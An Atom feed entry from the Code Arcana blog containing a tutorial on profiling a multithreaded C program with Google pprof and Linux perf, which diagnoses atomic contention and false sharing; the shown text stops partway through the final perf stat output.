<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all-en.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-02-26T00:00:00-08:00</updated><entry><title>Introduction to Using Profiling Tools</title><link href="http://codearcana.com/posts/2013/02/introduction-to-using-profiling-tools.html" rel="alternate"></link><updated>2013-02-26T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-02-26:posts/2013/02/introduction-to-using-profiling-tools.html</id><summary type="html">&lt;h2&gt;Performance tools&lt;/h2&gt;
&lt;p&gt;Frequently, we need to identify slow portions of our programs so we can improve performance. There are a number of tools available to profile programs and identify how much time is spent where. The most common of these tools sample the program periodically, recording information to be later analyzed. Typically, they involve a phase spent recording data and a later phase for analyzing it. We will use two common tools to analyze a simple program: Google &lt;code&gt;pprof&lt;/code&gt; and Linux &lt;code&gt;perf&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Google &lt;code&gt;pprof&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Google &lt;code&gt;pprof&lt;/code&gt; is a tool available as part of the Google &lt;a href="https://code.google.com/p/gperftools/"&gt;&lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt; package. It is is used with
&lt;code&gt;libprofiler&lt;/code&gt;, a sampling based profiler that is linked into your binary. There are 3 steps for using &lt;code&gt;pprof&lt;/code&gt;: linking it into the binary, generating profile output, and analyzing the output. The following links a binary with &lt;code&gt;libprofiler&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc main.c -lprofiler
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For any profile linked with &lt;code&gt;libprofiler&lt;/code&gt;, setting the environment variable &lt;code&gt;CPUPROFILE&lt;/code&gt; enables profiling and specifies the output file. The following command runs &lt;code&gt;./a.out&lt;/code&gt; and prints profiling data to &lt;code&gt;out.prof&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;out.prof ./a.out
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can now analyze this file using &lt;code&gt;pprof&lt;/code&gt;. Below, we output the sample counts for all the functions in &lt;code&gt;a.out&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --text ./a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;Total: 311 samples&lt;/span&gt;
&lt;span class="go"&gt;  144  46.3%  46.3%      144  46.3% bar&lt;/span&gt;
&lt;span class="go"&gt;   95  30.5%  76.8%       95  30.5% foo&lt;/span&gt;
&lt;span class="go"&gt;   72  23.2% 100.0%      311 100.0% baz&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% _start&lt;/span&gt;
&lt;span class="go"&gt;    0   0.0% 100.0%      311 100.0% main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;See full documentation &lt;a href="https://google-perftools.googlecode.com/svn/trunk/doc/cpuprofile.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Linux &lt;code&gt;perf&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;On Linux, the &lt;code&gt;perf&lt;/code&gt; system is a powerful tool for analyzing program / system performance. It provides some nice abstractions over tracking hardware counters on different CPUs. It defines a number of events to be tracked and recorded. Run &lt;code&gt;perf list&lt;/code&gt; to see a list of the events allowed on your system. &lt;/p&gt;
&lt;p&gt;To use &lt;code&gt;perf&lt;/code&gt;, you run: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    3121.725439 task-clock                #    0.997 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;             11 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;              7 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            308 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  9,121,960,506 cycles                    #    2.922 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  5,213,187,548 stalled-cycles-frontend   #   57.15% frontend cycles idle    [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;    292,952,401 stalled-cycles-backend    #    3.21% backend  cycles idle    [66.68%]&lt;/span&gt;
&lt;span class="go"&gt;  5,215,556,086 instructions              #    0.57  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    1.00  stalled cycles per insn [83.35%]&lt;/span&gt;
&lt;span class="go"&gt;  1,303,060,483 branches                  #  417.417 M/sec                   [83.35%]&lt;/span&gt;
&lt;span class="go"&gt;         66,559 branch-misses             #    0.01% of all branches         [83.33%]&lt;/span&gt;

&lt;span class="go"&gt;    3.132028707 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition to &lt;code&gt;perf stat&lt;/code&gt;, there quite a few other ways to use perf. Run &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to see a list of the commands (you might want to look into &lt;code&gt;perf record&lt;/code&gt; and &lt;code&gt;perf annotate&lt;/code&gt;). &lt;/p&gt;
&lt;p&gt;For an example of this being used in real life, see this excellent analysis of  &lt;a href="http://thread.gmane.org/gmane.comp.version-control.git/172286"&gt;this analysis of a string comparison bottleneck in &lt;code&gt;git gc&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Our Investigation&lt;/h2&gt;
&lt;p&gt;We compile the program with &lt;code&gt;-lprofiler&lt;/code&gt; so we can generate output to examine. &lt;code&gt;try_perf.c&lt;/code&gt; is a C program that counts the number of even values
in an array of random numbers. We run with 8 threads that all increment a global
counter every time they see an even number.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc try_perf.c -g -lprofiler -lpthread
&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a.out.prof ./a.out --num_threads&lt;span class="o"&gt;=&lt;/span&gt;8
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run pprof and get the source code annotated with the number of probes that 
hit that instruction during the trace (result below trimmed for brevity).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;   .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;   .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;   .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 303    323   65:  for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;   6     10   66:     uint32_t val = arg-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt;   6     15   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;   9    300   68:     __sync_fetch_and_add(args-&amp;gt;evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;   .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The output above is actually misleading: if you look at the assembly (shown below), the instruction immediately after the atomic instruction (the &lt;code&gt;addq   $0x1,-0x8(%rbp)&lt;/code&gt; after the &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;) gets excess hits that count towards the for loop when they should probably count towards the atomic instruction.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  9    300    68: __sync_fetch_and_add(arg-&amp;gt;num_evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;  4      5      4008a4: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;span class="go"&gt;  1      5      4008a8: mov    0x10(%rax),%rax&lt;/span&gt;
&lt;span class="go"&gt;  4    290      4008ac: lock addq $0x1,(%rax)&lt;/span&gt;
&lt;span class="go"&gt;303    320    65: for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;286    287      4008b1: addq   $0x1,-0x8(%rbp)&lt;/span&gt;
&lt;span class="go"&gt;  1      2      4008b6: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrm. Why are we spending a lot of time in &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;To understand this, we will use &lt;code&gt;perf&lt;/code&gt;. Run: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    5793.307952 task-clock                #    2.157 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            589 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             11 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          1,974 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt; 16,378,904,731 cycles                    #    2.827 GHz                     [83.37%]&lt;/span&gt;
&lt;span class="go"&gt; 10,407,719,950 stalled-cycles-frontend   #   63.54% frontend cycles idle    [83.38%]&lt;/span&gt;
&lt;span class="go"&gt;  8,213,634,448 stalled-cycles-backend    #   50.15% backend  cycles idle    [66.65%]&lt;/span&gt;
&lt;span class="go"&gt; 12,070,323,273 instructions              #    0.74  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    0.86  stalled cycles per insn [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  2,428,236,441 branches                  #  419.145 M/sec                   [83.31%]&lt;/span&gt;
&lt;span class="go"&gt;     67,558,697 branch-misses             #    2.78% of all branches         [83.35%]&lt;/span&gt;

&lt;span class="go"&gt;    2.685598183 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow, thats a lot of stalled instructions! The 8 threads are sharing the same counter, generating a lot of memory traffic. We modify the program so they all use their own counter, and then we aggregate at the end (if we do this, we don't need to use the atomic instruction).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;inarray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;pthread_create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;   
 &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
     &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But that didn't seem to help at all! We still spend most of our time on the increment, even though we aren't using an atomic instruction: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 22     44   65:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   66:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;157    308   68:    *(args-&amp;gt;num_evens) += 1;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Why could this be? Lets run &lt;code&gt;perf stat&lt;/code&gt; again and see:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;      4372.474270 task-clock                #    1.882 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;              385 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;                9 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            1,135 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;   12,411,517,583 cycles                    #    2.839 GHz                     [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    6,270,257,100 stalled-cycles-frontend   #   50.52% frontend cycles idle    [83.33%]&lt;/span&gt;
&lt;span class="go"&gt;    4,291,405,838 stalled-cycles-backend    #   34.58% backend  cycles idle    [66.78%]&lt;/span&gt;
&lt;span class="go"&gt;   12,306,996,386 instructions              #    0.99  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                            #    0.51  stalled cycles per insn [83.39%]&lt;/span&gt;
&lt;span class="go"&gt;    2,420,224,187 branches                  #  553.514 M/sec                   [83.40%]&lt;/span&gt;
&lt;span class="go"&gt;       69,182,448 branch-misses             #    2.86% of all branches         [83.30%]&lt;/span&gt;

&lt;span class="go"&gt;      2.323372370 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What is going on now? We &lt;em&gt;still&lt;/em&gt; have a lot of stalled instructions, but all those counters are different. See?&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh, they are all on the same cache line - we're experiencing false sharing. Let us use a thread local counter thats on a different cache line for each thread:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then look at the profile:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64:  size_t num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   65: &lt;/span&gt;
&lt;span class="go"&gt;144    292   66:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   67:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   68:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt; 13     16   69:    num_evens++;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71:  }&lt;/span&gt;
&lt;span class="go"&gt;  4      8   72:  return num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   73: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Good, our increment doesn't dominate the function anymore. We look at &lt;code&gt;perf stat&lt;/code&gt; and see:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    2977.781539 task-clock                #    1.472 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            177 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             12 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          3,506 page-faults               #    0.001 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  8,523,367,658 cycles                    #    2.862 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  2,057,253,537 stalled-cycles-frontend   #   24.14% frontend cycles idle    [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    919,272,160 stalled-cycles-backend    #   10.79% backend  cycles idle    [66.70%]&lt;/span&gt;
&lt;span class="go"&gt; 12,067,358,492 instructions              #    1.42  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    0.17  stalled cycles per insn [83.42%]&lt;/span&gt;
&lt;span class="go"&gt;  2,454,951,795 branches                  #  824.423 M/sec                   [83.42%]&lt;/span&gt;
